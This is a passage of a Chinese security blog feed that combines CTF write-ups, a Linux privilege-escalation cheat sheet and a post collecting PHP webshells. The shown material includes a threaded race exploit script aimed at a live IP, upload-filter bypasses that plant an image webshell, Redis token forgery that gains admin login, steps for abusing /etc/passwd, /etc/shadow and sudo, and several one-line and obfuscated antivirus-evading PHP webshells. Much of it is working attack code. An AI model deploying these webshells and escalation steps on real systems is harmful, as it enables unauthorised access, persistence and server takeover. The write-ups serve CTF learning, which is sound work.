scandir(&quot;/etc/acgfdffhbd/gfediefagf/hedbfegbjb/eegcbdabad/ibadcafecb/&quot;)); ?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;help.txt&#x27;,</span></span><br><span class="line">        <span class="comment"># f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;) </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://123.60.215.249:25900/&#x27;</span>, data=data)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br><span class="line">        event.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>flag：CISCN{FhDKa-MuU0P-FJ9lj-MsZcg-6hXCa-}</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>example.php 源码泄露。</p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这么大个的东西你是想d我吗？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imageinfo</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span>[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;东西不能方方正正的话就很讨厌&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fileName</span>=urldecode(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$fileName</span>,<span class="string">&quot;c&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;i&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;h&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;有些东西让你传上去的话那可不得了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imagePath</span> = <span class="string">&quot;image/&quot;</span> . mb_strtolower(<span class="variable">$fileName</span>);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$imagePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;传都没有传上去&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>example.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    <span class="variable">$name_for_zip</span> = <span class="string">&quot;example/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>)[count(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>))-<span class="number">1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;要不咱们再看看？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;open(<span class="variable">$name_for_zip</span>) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;都不能解压呢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;可以解压，我想想存哪里&quot;</span>;</span><br><span class="line">    <span class="variable">$pos_for_zip</span> = <span class="string">&quot;/tmp/example/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;extractTo(<span class="variable">$pos_for_zip</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">    unlink(<span class="variable">$name_for_zip</span>);</span><br><span class="line">    <span class="variable">$files</span> = glob(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">        <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$final_name</span> = pathinfo(<span class="variable">$file</span>)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng(<span class="variable">$second</span>, <span class="string">&#x27;example/&#x27;</span>.<span class="variable">$final_name</span>);</span><br><span class="line">            imagedestroy(<span class="variable">$second</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用这个过 getimagesize：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br></pre></td></tr></table></figure><p>用 %C4%B0 通过 mb_strtolower urldecode 绕过 i 的过滤。利用 <a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</a> 绕过图片检查。</p><p>修改一下脚本，将 generate.py 中的值取出来：</p><p><img src="https://i.loli.net/2021/05/16/UQ64A82S5huXOWT.png"></p><p>丢到 010 里面改一下：</p><p><img src="https://i.loli.net/2021/05/16/d7v28UgwFLkjrfO.png"></p><p>再转回去：</p><p><img src="https://i.loli.net/2021/05/16/IS7vtUhoXAELsBl.png"></p><p>最后修改脚本里的值，生成图片🐎：<code>python generate.py -m php -o a.png</code></p><p>然后完事了，后面的自行脑补。</p><h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><p>Yii2 框架链子，不会，等 guoke 和赵总带带了。</p><h2 id="babyblog"><a href="#babyblog" class="headerlink" title="babyblog"></a>babyblog</h2><p>/templates/ 下源码泄露。</p><h2 id="toktok"><a href="#toktok" class="headerlink" title="toktok"></a>toktok</h2><p>```<br>POST /admin<br>username=admin&amp;password=admin</p><p>获得一个 VPN 的 apk，逆向？</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_KCTF_WEB_WP</title>
      <link href="2021/05/14/2021-KCTF-WEB-WP/"/>
      <url>2021/05/14/2021-KCTF-WEB-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="统一门派"><a href="#统一门派" class="headerlink" title="统一门派"></a>统一门派</h2><p>若依开源快速开发平台：<a href="https://gitee.com/y_project/RuoYi-Vue">https://gitee.com/y_project/RuoYi-Vue</a></p><ul><li>前端采用Vue、Element UI</li><li>后端采用Spring Boot、Spring Security、Redis &amp; Jwt</li><li>权限认证使用Jwt，支持多终端认证系统</li></ul><p>端口开放了 Redis 的 6379，可以进行未授权访问：</p><p><img src="https://i.loli.net/2021/05/14/QaUGoWvY5VECknF.png"></p><p><code>keys *</code> 会发现存在一个缓存了用户登录 token 的 <code>login_tokens:3109ec3f-6e84-48f5-bc1f-4f351d236333</code>（其它的都是别的师傅在打这个环境的时候留下的。。），可以 get 一下：<code>get &quot;login_tokens:3109ec3f-6e84-48f5-bc1f-4f351d236333&quot;</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ruoyi.common.core.domain.model.LoginUser\&quot;,\&quot;accountNonExpired\&quot;:true,\&quot;accountNonLocked\&quot;:true,\&quot;browser\&quot;:\&quot;Chrome 9\&quot;,\&quot;credentialsNonExpired\&quot;:true,\&quot;enabled\&quot;:true,\&quot;expireTime\&quot;:1690354819542,\&quot;ipaddr\&quot;:\&quot;117.175.182.182\&quot;,\&quot;loginLocation\&quot;:\&quot;XX XX\&quot;,\&quot;loginTime\&quot;:1620354879542,\&quot;os\&quot;:\&quot;Windows 10\&quot;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;permissions\&quot;:Set[\&quot;*:*:*\&quot;],\&quot;token\&quot;:\&quot;07aaf192-ca8f-4db7-a6a2-ee81dbf07d58\&quot;,\&quot;user\&quot;:&#123;\&quot;admin\&quot;:true,\&quot;avatar\&quot;:\&quot;\&quot;,\&quot;createBy\&quot;:\&quot;admin\&quot;,\&quot;createTime\&quot;:1620186031000,\&quot;delFlag\&quot;:\&quot;0\&quot;,\&quot;dept\&quot;:&#123;\&quot;children\&quot;:[],\&quot;deptId\&quot;:103,\&quot;deptName\&quot;:\&quot;\xe7\xa0\x94\xe5\x8f\x91\xe9\x83\xa8\xe9\x97\xa8\&quot;,\&quot;leader\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;orderNum\&quot;:\&quot;1\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;parentId\&quot;:101,\&quot;status\&quot;:\&quot;0\&quot;&#125;,\&quot;deptId\&quot;:103,\&quot;email\&quot;:\&quot;ry@163.com\&quot;,\&quot;loginDate\&quot;:1620186031000,\&quot;loginIp\&quot;:\&quot;127.0.0.1\&quot;,\&quot;nickName\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;phonenumber\&quot;:\&quot;15888888888\&quot;,\&quot;remark\&quot;:\&quot;\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roles\&quot;:[&#123;\&quot;admin\&quot;:true,\&quot;dataScope\&quot;:\&quot;1\&quot;,\&quot;deptCheckStrictly\&quot;:false,\&quot;flag\&quot;:false,\&quot;menuCheckStrictly\&quot;:false,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;roleId\&quot;:1,\&quot;roleKey\&quot;:\&quot;admin\&quot;,\&quot;roleName\&quot;:\&quot;\xe8\xb6\x85\xe7\xba\xa7\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roleSort\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;&#125;],\&quot;sex\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;,\&quot;userId\&quot;:1,\&quot;userName\&quot;:\&quot;admin\&quot;&#125;,\&quot;username\&quot;:\&quot;admin\&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>猜测 JWT 的密钥为默认密钥，可以伪造 Admin-Token 登录，直接上演示地址获取一下：<a href="http://vue.ruoyi.vip/index">http://vue.ruoyi.vip/index</a></p><p><img src="https://i.loli.net/2021/05/14/AO9EX5cQRCtDzrB.png"></p><p>Base64 解码一下就有：</p><p><img src="https://i.loli.net/2021/05/14/6kwOlC5eGRtbDhW.png"></p><p>然后 set 一个新的 login_tokens：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set login_tokens:f4c75427-0b4a-493c-9987-db9f8c9f4cda &quot;&#123;\&quot;@type\&quot;:\&quot;com.ruoyi.common.core.domain.model.LoginUser\&quot;,\&quot;accountNonExpired\&quot;:true,\&quot;accountNonLocked\&quot;:true,\&quot;browser\&quot;:\&quot;Chrome 9\&quot;,\&quot;credentialsNonExpired\&quot;:true,\&quot;enabled\&quot;:true,\&quot;expireTime\&quot;:1690354819542,\&quot;ipaddr\&quot;:\&quot;117.175.182.182\&quot;,\&quot;loginLocation\&quot;:\&quot;XX XX\&quot;,\&quot;loginTime\&quot;:1620354879542,\&quot;os\&quot;:\&quot;Windows 10\&quot;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;permissions\&quot;:Set[\&quot;*:*:*\&quot;],\&quot;token\&quot;:\&quot;07aaf192-ca8f-4db7-a6a2-ee81dbf07d58\&quot;,\&quot;user\&quot;:&#123;\&quot;admin\&quot;:true,\&quot;avatar\&quot;:\&quot;\&quot;,\&quot;createBy\&quot;:\&quot;admin\&quot;,\&quot;createTime\&quot;:1620186031000,\&quot;delFlag\&quot;:\&quot;0\&quot;,\&quot;dept\&quot;:&#123;\&quot;children\&quot;:[],\&quot;deptId\&quot;:103,\&quot;deptName\&quot;:\&quot;\xe7\xa0\x94\xe5\x8f\x91\xe9\x83\xa8\xe9\x97\xa8\&quot;,\&quot;leader\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;orderNum\&quot;:\&quot;1\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;parentId\&quot;:101,\&quot;status\&quot;:\&quot;0\&quot;&#125;,\&quot;deptId\&quot;:103,\&quot;email\&quot;:\&quot;ry@163.com\&quot;,\&quot;loginDate\&quot;:1620186031000,\&quot;loginIp\&quot;:\&quot;127.0.0.1\&quot;,\&quot;nickName\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;phonenumber\&quot;:\&quot;15888888888\&quot;,\&quot;remark\&quot;:\&quot;\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roles\&quot;:[&#123;\&quot;admin\&quot;:true,\&quot;dataScope\&quot;:\&quot;1\&quot;,\&quot;deptCheckStrictly\&quot;:false,\&quot;flag\&quot;:false,\&quot;menuCheckStrictly\&quot;:false,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;roleId\&quot;:1,\&quot;roleKey\&quot;:\&quot;admin\&quot;,\&quot;roleName\&quot;:\&quot;\xe8\xb6\x85\xe7\xba\xa7\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roleSort\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;&#125;],\&quot;sex\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;,\&quot;userId\&quot;:1,\&quot;userName\&quot;:\&quot;admin\&quot;&#125;,\&quot;username\&quot;:\&quot;admin\&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>BP 改一下 response：</p><p><img src="https://i.loli.net/2021/05/14/me5PWivzr6MGcB9.png"></p><p>原来的是：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;msg&quot;</span>:<span class="string">&quot;用户不存在/密码错误&quot;</span>,<span class="attr">&quot;code&quot;</span>:<span class="number">500</span>&#125;</span><br></pre></td></tr></table></figure><p>直接改为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;msg&quot;</span>:<span class="string">&quot;Du1 says nmsl&quot;</span>,<span class="attr">&quot;code&quot;</span>:<span class="number">200</span>,<span class="attr">&quot;token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6ImY0Yzc1NDI3LTBiNGEtNDkzYy05OTg3LWRiOWY4YzlmNGNkYSJ9.2Cg8jbraYAmfFtUHCjoZYcXPnP33FfvR6ud8zrTJouC_qj3C3tq2CmV2x2scXMntgO3nKeMVMuVnc1E1pbgtMg&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/14/CtJroewEv4q5jLz.jpg"></p><p>这题还有个非预期：</p><p><img src="https://i.loli.net/2021/05/14/tEbeKH2OdVCnomf.png"></p><p>👴也是很异或呢。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权姿势小结</title>
      <link href="2021/05/13/%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%B0%8F%E7%BB%93/"/>
      <url>2021/05/13/%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>提权可能需要反弹 shell，因为脚本语言无法形成管道，需要创造一个管道才能进行后续的操作，比如溢出成功之后返回一个 root 权限的 shell，脚本语言执行完就完了，不会返回一个可以操作的 root shell。</p></blockquote><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="0x00-密码复用"><a href="#0x00-密码复用" class="headerlink" title="0x00 密码复用"></a>0x00 密码复用</h3><p>数据库 root，后台 web 密码……all may root pasword</p><h3 id="0x01-passwd-shadow"><a href="#0x01-passwd-shadow" class="headerlink" title="0x01  passwd / shadow"></a>0x01  passwd / shadow</h3><p>检测 /etc/passwd、/etc/shadow 是否可读可写：</p><p><img src="https://i.loli.net/2021/05/13/hOvzJUqNI7PlLYB.png"></p><ul><li>passwd 可写：可以将自己当前用户设置为伪 root，例如 <code>Du1:x:1001:1001</code>，将其换为 <code>Du1:x:0:0</code></li><li>shadow 可读：直接将其 root 的 hash 复制出来，爆破</li></ul><h3 id="0x02-sudo"><a href="#0x02-sudo" class="headerlink" title="0x02 sudo"></a>0x02 sudo</h3><p>sudo 大家经常遇到，比如执行权限不够时加 sudo 执行，sudo 是让普通用户使用超级用户的命令。其配置文件为 /etc/sudoers，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/13/81TBora6WV4ZuzU.png"></p><h4 id="bin-cp"><a href="#bin-cp" class="headerlink" title="/bin/cp"></a>/bin/cp</h4><p>如果可以以 guess1 身份执行 cp，而此时我们的用户为 guess2，那么我们可以写入 guess1 的 authorized_keys 来包含 guess2 的公钥，从而直接用 guess2 的 id_rsa 免密 ssh 登录 guess1，因为 guess1 没有权限访问 guess2，而 guess2 也亦然，所以先丢到 /tmp，再转。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp ~/.ssh/id_rsa.pub /tmp/authorized_keys</span><br><span class="line">chmod 777 /tmp/authorized_keys</span><br><span class="line">sudo -u guess1 /bin/cp /tmp/authorized_keys /home/jen/.ssh/</span><br><span class="line">ssh -i id_rsa guess1@127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/14/dbGzqjw1trkXy3s.jpg"></p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="获取交互式-shell"><a href="#获取交互式-shell" class="headerlink" title="获取交互式 shell"></a>获取交互式 shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python2 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 智慧的收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 肾透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>👴的养马场</title>
      <link href="2021/05/11/%F0%9F%91%B4%E7%9A%84%E5%85%BB%E9%A9%AC%E5%9C%BA/"/>
      <url>2021/05/11/%F0%9F%91%B4%E7%9A%84%E5%85%BB%E9%A9%AC%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/05/12/BoeflE1bw7ihPW8.jpg"></p><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="简单一句话"><a href="#简单一句话" class="headerlink" title="简单一句话"></a>简单一句话</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;Du1&quot;</span>]);phpinfo(); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @system(<span class="variable">$_GET</span>[<span class="string">&quot;Du1&quot;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> usort(<span class="variable">$_GET</span>,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);<span class="meta">?&gt;</span>  <span class="comment">// ?1=1+1&amp;2=eval($_POST[x])</span></span><br></pre></td></tr></table></figure><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><h4 id="简单免杀"><a href="#简单免杀" class="headerlink" title="简单免杀"></a>简单免杀</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GLOBALS</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;_POST&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span><span class="comment">/**nice**/</span>(<span class="string">&#x27;&#x27;</span>. <span class="variable">$a</span>[<span class="variable">$str</span>][<span class="string">&#x27;cf87efe0c36a12aec113cd7982043573&#x27;</span>]. <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;absbsbebrbt&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span 